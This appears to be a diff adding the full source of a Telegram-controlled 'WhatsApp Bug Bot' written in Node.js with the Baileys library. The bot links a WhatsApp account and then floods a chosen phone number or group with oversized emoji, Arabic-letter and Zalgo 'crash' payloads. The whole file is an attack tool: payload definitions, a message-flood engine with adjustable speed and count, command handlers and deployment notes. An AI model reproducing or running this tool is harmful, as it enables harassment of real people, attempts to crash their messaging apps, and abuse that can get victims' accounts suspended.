@@ -1,0 +1,577 @@
+const { Telegraf, Markup } = require('telegraf');
+const { makeWASocket, useMultiFileAuthState, 
+        Browsers, DisconnectReason } = require('@whiskeysockets/baileys');
+const { Boom } = require('@hapi/boom');
+const fs = require('fs');
+const path = require('path');
+const pino = require('pino');
+const config = require('./config.json');
+const crypto = require('crypto');
+
+// ============================================
+// CONFIG
+// ============================================
+const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
+const OWNER_ID = config.OWNER_ID ? parseInt(config.OWNER_ID) : null;
+const ADMIN_IDS = config.ADMIN_IDS;
+const DEFAULT_DELAY = config.DEFAULT_DELAY || 50;
+const DEFAULT_COUNT = config.DEFAULT_COUNT || 80;
+const FLOOD_COUNT = config.FLOOD_COUNT || 200;
+const ALLOW_ALL_USERS = config.ALLOW_ALL_USERS || false;
+
+// Sessions folder
+const SESSION_DIR = './wa_sessions/';
+if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);
+
+// ============================================
+// CRASH PAYLOADS - FULL COLLECTION
+// ============================================
+const PAYLOADS = {
+    // 🥇 LIGHT CRASH - Small emoji bomb
+    lightCrash: "😀".repeat(4000),
+    
+    // 🥇 HEAVY CRASH - Unicode memory corruption
+    heavyCrash: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1500),
+    
+    // 🥇 FLOOD - Mix of everything
+    flood: ("😀🙂😉😊😇🥰😍🤩😘😗😚😋😛😜🤪😝🤑🤗🤭🤫🤔🤐🤨😐😑😶😏😒🙄😬🤥😌😔😪🤤😴😷🤒🤕🤢🤮🥴😵🤯🤠🥳🥸😎🤓🧐😕😟🙁😮😯😲😳🥺😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬").repeat(150),
+    
+    // 🥇 SUSPEND - Large Unicode + emoji
+    suspend: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(2000) + "😀".repeat(4000),
+    
+    // 🥇 GROUP CRASH - Maximum payload
+    groupCrash: ("😀".repeat(2000) + "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1000)).repeat(2),
+    
+    // 🥇 SPECIAL - Zalgo text overload
+    zalgoCrash: "H̷̷̷E̷̷̷L̷̷̷L̷̷̷O̷̷̷".repeat(3000),
+};
+
+// ============================================
+// BOT STATE
+// ============================================
+let waSocket = null;
+let waConnected = false;
+let waPairingCode = null;
+let attackState = {
+    isRunning: false,
+    interval: null,
+    target: null,
+    type: null,
+    sentCount: 0,
+    maxCount: DEFAULT_COUNT,
+    delay: DEFAULT_DELAY,
+};
+
+// Allowed users list
+let allowedUsers = [];
+
+// ============================================
+// TELEGRAM BOT SETUP
+// ============================================
+const bot = new Telegraf(TELEGRAM_BOT_TOKEN);
+
+// Auth middleware
+function isAuthorized(ctx) {
+    if (ALLOW_ALL_USERS) return true;
+    const userId = ctx.from?.id;
+    if (OWNER_ID && userId === OWNER_ID) return true;
+    if (ADMIN_IDS.includes(userId)) return true;
+    if (allowedUsers.includes(userId)) return true;
+    return false;
+}
+
+// Auth guard
+bot.use(async (ctx, next) => {
+    if (ctx.message?.text?.startsWith('/start')) return next();
+    if (!isAuthorized(ctx)) {
+        return ctx.reply('⛔ Unauthorized. You are not allowed to use this bot.');
+    }
+    return next();
+});
+
+// ============================================
+// WHATSAPP CONNECTION MANAGER
+// ============================================
+async function startWhatsApp() {
+    const sessionName = 'main_session';
+    const sessionPath = path.join(SESSION_DIR, sessionName);
+    
+    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+    
+    waSocket = makeWASocket({
+        auth: state,
+        printQRInTerminal: false,
+        browser: Browsers.ubuntu('Chrome'),
+        logger: pino({ level: 'silent' }),
+        syncFullHistory: false,
+    });
+    
+    // Handle QR Code
+    waSocket.ev.on('creds.update', saveCreds);
+    
+    // Handle connection updates
+    waSocket.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+        
+        if (qr) {
+            waConnected = false;
+            // QR ko telegram par bhejna hai
+            console.log('[QR] New QR generated');
+        }
+        
+        if (connection === 'open') {
+            waConnected = true;
+            console.log('[WA] Connected successfully!');
+            const number = waSocket.user?.id?.split(':')[0];
+            console.log(`[WA] Logged in as: ${number}`);
+            
+            // Telegram par notification bhejo
+            const ownerChat = OWNER_ID || ADMIN_IDS[0];
+            if (ownerChat) {
+                await bot.telegram.sendMessage(ownerChat, 
+                    `✅ *WhatsApp Connected!*\n\nNumber: +${number}\nStatus: Ready to attack`,
+                    { parse_mode: 'Markdown' }
+                );
+            }
+        }
+        
+        if (connection === 'close') {
+            waConnected = false;
+            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
+            console.log(`[WA] Disconnected. Reason: ${reason}`);
+            
+            // Auto reconnect after 5 seconds
+            setTimeout(() => startWhatsApp(), 5000);
+        }
+    });
+    
+    // Pairing code generate karo
+    waSocket.ev.on('qr', (qr) => {
+        waPairingCode = qr;
+    });
+    
+    return waSocket;
+}
+
+// ============================================
+// PAIRING CODE GENERATION
+// ============================================
+async function getPairingCode(phoneNumber) {
+    try {
+        if (!waSocket) {
+            await startWhatsApp();
+            await new Promise(r => setTimeout(r, 2000));
+        }
+        
+        // Baileys mein pairing code
+        const code = await waSocket.requestPairingCode(phoneNumber);
+        return code;
+    } catch (err) {
+        console.error('[PAIR] Error:', err);
+        return null;
+    }
+}
+
+// ============================================
+// CRASH ENGINE
+// ============================================
+function getPayload(type) {
+    switch(type) {
+        case 'light': return PAYLOADS.lightCrash;
+        case 'heavy': return PAYLOADS.heavyCrash;
+        case 'flood': return PAYLOADS.flood;
+        case 'suspend': return PAYLOADS.suspend;
+        case 'group': return PAYLOADS.groupCrash;
+        case 'zalgo': return PAYLOADS.zalgoCrash;
+        default: return PAYLOADS.heavyCrash;
+    }
+}
+
+async function startAttack(ctx, targetNumber, attackType) {
+    if (attackState.isRunning) {
+        return ctx.reply('⚠️ *Attack already running!*\n\nUse /stop to stop it first.', 
+            { parse_mode: 'Markdown' });
+    }
+    
+    if (!waConnected || !waSocket) {
+        return ctx.reply('❌ *WhatsApp not connected!*\n\nUse /pair first to connect WhatsApp.', 
+            { parse_mode: 'Markdown' });
+    }
+    
+    const formattedNumber = targetNumber.includes('@') 
+        ? targetNumber 
+        : `${targetNumber}@s.whatsapp.net`;
+    
+    const payload = getPayload(attackType);
+    const maxCount = attackType === 'flood' ? FLOOD_COUNT : attackState.maxCount;
+    
+    attackState.isRunning = true;
+    attackState.target = targetNumber;
+    attackState.type = attackType;
+    attackState.sentCount = 0;
+    attackState.interval = null;
+    
+    await ctx.reply(`🎯 *Attack Started!*\n\n` +
+        `Target: \`${targetNumber}\`\n` +
+        `Type: *${attackType.toUpperCase()}*\n` +
+        `Count: ${maxCount}\n` +
+        `Delay: ${attackState.delay}ms`,
+        { parse_mode: 'Markdown' }
+    );
+    
+    attackState.interval = setInterval(async () => {
+        if (attackState.sentCount >= maxCount) {
+            clearInterval(attackState.interval);
+            attackState.isRunning = false;
+            await ctx.reply(`✅ *Attack Complete!*\n\n` +
+                `${attackState.sentCount} messages sent to \`${targetNumber}\``,
+                { parse_mode: 'Markdown' }
+            );
+            return;
+        }
+        
+        try {
+            await waSocket.sendMessage(formattedNumber, { text: payload });
+            attackState.sentCount++;
+            
+            if (attackState.sentCount % 10 === 0) {
+                // Har 10 messages par progress update bhejo (but spam na ho)
+                // Optional - comment out if annoying
+            }
+        } catch (err) {
+            console.error(`[ATTACK] Error:`, err);
+        }
+    }, attackState.delay);
+}
+
+function stopAttack(ctx) {
+    if (!attackState.isRunning) {
+        return ctx.reply('ℹ️ No active attack to stop.');
+    }
+    
+    clearInterval(attackState.interval);
+    attackState.isRunning = false;
+    
+    const sent = attackState.sentCount;
+    const target = attackState.target;
+    
+    ctx.reply(`🛑 *Attack Stopped!*\n\n` +
+        `${sent} messages sent to \`${target}\``,
+        { parse_mode: 'Markdown' }
+    );
+}
+
+// ============================================
+// TELEGRAM COMMANDS
+// ============================================
+
+// /start
+bot.start(async (ctx) => {
+    const name = ctx.from.first_name || 'User';
+    
+    const welcomeMsg = `👋 *Welcome ${name}!*\n\n` +
+        `🤖 *WhatsApp Bug Bot v3.0*\n` +
+        `Telegram Controlled - No Termux Required\n\n` +
+        `📋 *Available Commands:*\n\n` +
+        `🔹 *Connection:*\n` +
+        `  /pair 91XXXXXXXXXX → Generate pairing code\n` +
+        `  /status → Check bot & WhatsApp status\n` +
+        `  /logout → Disconnect WhatsApp\n\n` +
+        `🔹 *Attacks:*\n` +
+        `  /crash 91XXXXXXXXXX → Heavy crash\n` +
+        `  /light 91XXXXXXXXXX → Light crash\n` +
+        `  /flood 91XXXXXXXXXX → Flood (200 msgs)\n` +
+        `  /suspend 91XXXXXXXXXX → Suspend attempt\n` +
+        `  /group groupid@g.us → Group crash\n\n` +
+        `🔹 *Settings:*\n` +
+        `  /delay 50 → Set speed (ms)\n` +
+        `  /count 100 → Set message count\n` +
+        `  /stop → Stop running attack\n\n` +
+        `🔹 *Info:*\n` +
+        `  /help → Full help\n` +
+        `  /payloads → List available payloads\n`;
+    
+    await ctx.replyWithMarkdown(welcomeMsg);
+});
+
+// /pair - WhatsApp connect karo
+bot.command('pair', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /pair 91XXXXXXXXXX\n\nCountry code ke saath number do.');
+    }
+    
+    let phoneNumber = args[1].replace(/[^0-9]/g, '');
+    
+    if (phoneNumber.startsWith('0')) {
+        phoneNumber = phoneNumber.substring(1);
+    }
+    
+    if (phoneNumber.length < 10) {
+        return ctx.reply('❌ Invalid number. Country code ke saath pura number do.\nExample: /pair 919XXXXXXXXX');
+    }
+    
+    await ctx.reply(`⏳ *Generating pairing code...*\n\nNumber: +${phoneNumber}\n\nPlease wait 10-15 seconds...`,
+        { parse_mode: 'Markdown' }
+    );
+    
+    try {
+        const code = await getPairingCode(phoneNumber);
+        
+        if (code) {
+            await ctx.replyWithMarkdown(
+                `✅ *Pairing Code Generated!*\n\n` +
+                `📱 Code: \`${code}\`\n\n` +
+                `📌 *Steps:*\n` +
+                `1. Open WhatsApp on your phone\n` +
+                `2. Go to *Settings → Linked Devices*\n` +
+                `3. Tap *Link a Device*\n` +
+                `4. Enter this code: \`${code}\`\n\n` +
+                `⏳ Bot will auto-confirm when connected.`
+            );
+        } else {
+            ctx.reply('❌ Failed to generate code. Bot restart ho raha hai, 30s baad /pair dobara karo.');
+        }
+    } catch (err) {
+        ctx.reply(`❌ Error: ${err.message}`);
+    }
+});
+
+// /status
+bot.command('status', async (ctx) => {
+    const waStatus = waConnected ? '✅ Connected' : '❌ Disconnected';
+    const waNumber = waSocket?.user?.id?.split(':')[0] || '-';
+    const attackStatus = attackState.isRunning ? `✅ Running (${attackState.sentCount} sent)` : '❌ Idle';
+    
+    const statusMsg = `📊 *Bot Status*\n\n` +
+        `🤖 *Telegram Bot:* ✅ Active\n` +
+        `📱 *WhatsApp:* ${waStatus}\n` +
+        `   Number: +${waNumber}\n` +
+        `🎯 *Attack:* ${attackStatus}\n` +
+        `   Target: ${attackState.target || '-'}\n` +
+        `⚙️ *Settings:*\n` +
+        `   Delay: ${attackState.delay}ms\n` +
+        `   Count: ${attackState.maxCount}\n` +
+        `   Flood: ${FLOOD_COUNT}\n` +
+        `👥 *Users:* ${ALLOW_ALL_USERS ? 'All allowed' : 'Restricted'}`;
+    
+    await ctx.replyWithMarkdown(statusMsg);
+});
+
+// /crash - Heavy crash
+bot.command('crash', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /crash 91XXXXXXXXXX');
+    }
+    await startAttack(ctx, args[1], 'heavy');
+});
+
+// /light - Light crash
+bot.command('light', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /light 91XXXXXXXXXX');
+    }
+    await startAttack(ctx, args[1], 'light');
+});
+
+// /flood
+bot.command('flood', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /flood 91XXXXXXXXXX');
+    }
+    await startAttack(ctx, args[1], 'flood');
+});
+
+// /suspend
+bot.command('suspend', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /suspend 91XXXXXXXXXX');
+    }
+    await startAttack(ctx, args[1], 'suspend');
+});
+
+// /group
+bot.command('group', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /group GROUP_ID\n\nYa /group 91XXXXXXXXXX se group member crash');
+    }
+    await startAttack(ctx, args[1], 'group');
+});
+
+// /delay
+bot.command('delay', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply(`⏱️ Current delay: ${attackState.delay}ms\nUsage: /delay 50`);
+    }
+    const newDelay = parseInt(args[1]);
+    if (isNaN(newDelay) || newDelay < 10) {
+        return ctx.reply('❌ Minimum delay 10ms. Use: /delay 100');
+    }
+    attackState.delay = newDelay;
+    await ctx.reply(`✅ Delay set to ${newDelay}ms`);
+});
+
+// /count
+bot.command('count', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply(`🔢 Current count: ${attackState.maxCount}\nUsage: /count 100`);
+    }
+    const newCount = parseInt(args[1]);
+    if (isNaN(newCount) || newCount < 1) {
+        return ctx.reply('❌ Invalid count. Use: /count 80');
+    }
+    attackState.maxCount = newCount;
+    await ctx.reply(`✅ Message count set to ${newCount}`);
+});
+
+// /stop
+bot.command('stop', (ctx) => stopAttack(ctx));
+
+// /payloads
+bot.command('payloads', async (ctx) => {
+    const payloadMsg = `📦 *Available Payloads*\n\n` +
+        `1️⃣ *Light* — ${PAYLOADS.lightCrash.length.toLocaleString()} chars\n` +
+        `   Command: /light NUMBER\n\n` +
+        `2️⃣ *Heavy* — ${PAYLOADS.heavyCrash.length.toLocaleString()} chars\n` +
+        `   Command: /crash NUMBER\n\n` +
+        `3️⃣ *Flood* — ${PAYLOADS.flood.length.toLocaleString()} chars\n` +
+        `   Command: /flood NUMBER\n\n` +
+        `4️⃣ *Suspend* — ${PAYLOADS.suspend.length.toLocaleString()} chars\n` +
+        `   Command: /suspend NUMBER\n\n` +
+        `5️⃣ *Group* — ${PAYLOADS.groupCrash.length.toLocaleString()} chars\n` +
+        `   Command: /group GROUP_ID\n\n` +
+        `6️⃣ *Zalgo* — ${PAYLOADS.zalgoCrash.length.toLocaleString()} chars\n` +
+        `   Command: /zalgo NUMBER\n\n` +
+        `⚙️ *Settings:* Delay ${attackState.delay}ms | Count ${attackState.maxCount}`;
+    
+    await ctx.replyWithMarkdown(payloadMsg);
+});
+
+// /zalgo
+bot.command('zalgo', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /zalgo 91XXXXXXXXXX');
+    }
+    await startAttack(ctx, args[1], 'zalgo');
+});
+
+// /help
+bot.command('help', async (ctx) => {
+    await ctx.replyWithMarkdown(
+        `📖 *Full Command Reference*\n\n` +
+        `*📱 WhatsApp Connection*\n` +
+        `  /pair NUMBER → Generate pairing code\n` +
+        `  /status → Check connection & attack status\n` +
+        `  /logout → Disconnect WhatsApp\n\n` +
+        `*⚔️ Attack Commands*\n` +
+        `  /light NUMBER → Light crash\n` +
+        `  /crash NUMBER → Heavy crash (recommended)\n` +
+        `  /flood NUMBER → Flood attack (200 msgs)\n` +
+        `  /suspend NUMBER → Suspend attempt\n` +
+        `  /group ID → Group crash\n` +
+        `  /zalgo NUMBER → Zalgo text crash\n\n` +
+        `*⚙️ Settings*\n` +
+        `  /delay MS → Set delay (10-5000ms)\n` +
+        `  /count N → Set attack message count\n` +
+        `  /stop → Stop running attack\n\n` +
+        `*📊 Info*\n` +
+        `  /payloads → List all payloads\n` +
+        `  /status → Full status\n` +
+        `  /help → This message\n\n` +
+        `*💡 Quick Tips:*\n` +
+        `• Sabse pehle /pair se WhatsApp connect karo\n` +
+        `• Default heavy crash ke liye /crash NUMBER\n` +
+        `• Attack ko rokne ke liye /stop\n` +
+        `• Speed badhani ho to /delay 30 (lower = faster)`
+    );
+});
+
+// /logout
+bot.command('logout', async (ctx) => {
+    if (!waConnected) {
+        return ctx.reply('ℹ️ WhatsApp already disconnected.');
+    }
+    
+    stopAttack(ctx);
+    
+    try {
+        await waSocket.logout();
+        waConnected = false;
+        await ctx.reply('✅ *WhatsApp logged out successfully!*', { parse_mode: 'Markdown' });
+    } catch (err) {
+        ctx.reply(`❌ Error logging out: ${err.message}`);
+    }
+});
+
+// /adduser - Owner can add users
+bot.command('adduser', async (ctx) => {
+    if (ctx.from.id !== OWNER_ID) {
+        return ctx.reply('⛔ Only bot owner can add users.');
+    }
+    const args = ctx.message.text.split(' ');
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: /adduser USER_ID');
+    }
+    const userId = parseInt(args[1]);
+    if (!allowedUsers.includes(userId)) {
+        allowedUsers.push(userId);
+    }
+    await ctx.reply(`✅ User ${userId} added to allowed list.`);
+});
+
+// ============================================
+// ERROR HANDLER
+// ============================================
+bot.catch((err, ctx) => {
+    console.error(`[TELEGRAM] Error for ${ctx.updateType}:`, err);
+});
+
+// ============================================
+// START BOT
+// ============================================
+async function main() {
+    console.log(`
+╔═══════════════════════════════════════╗
+║     💥 WHATSAPP BUG BOT v3.0          ║
+║     Telegram Controlled - Cloud Based ║
+║     No Termux Required 🚫             ║
+╠═══════════════════════════════════════╣
+║  Deploy: Railway / Render / Koyeb     ║
+║  Control: Telegram Commands           ║
+║  Engine: Baileys (WhatsApp Web API)   ║
+╚═══════════════════════════════════════╝
+    `);
+    
+    // Telegram bot start karo
+    bot.launch();
+    console.log('[TG] Telegram Bot started!');
+    
+    // WhatsApp connection start karo
+    await startWhatsApp();
+    console.log('[WA] WhatsApp engine initializing...');
+}
+
+// Handle shutdown
+process.on('SIGINT', async () => {
+    stopAttack({ reply: () => {} });
+    await waSocket?.logout();
+    bot.stop('SIGINT');
+    process.exit(0);
+});
+
+process.on('SIGTERM', async () => {
+    stopAttack({ reply: () => {} });
+    await waSocket?.logout();
+    bot.stop('SIGTERM');
+    process.exit(0);
+});
+
+main();
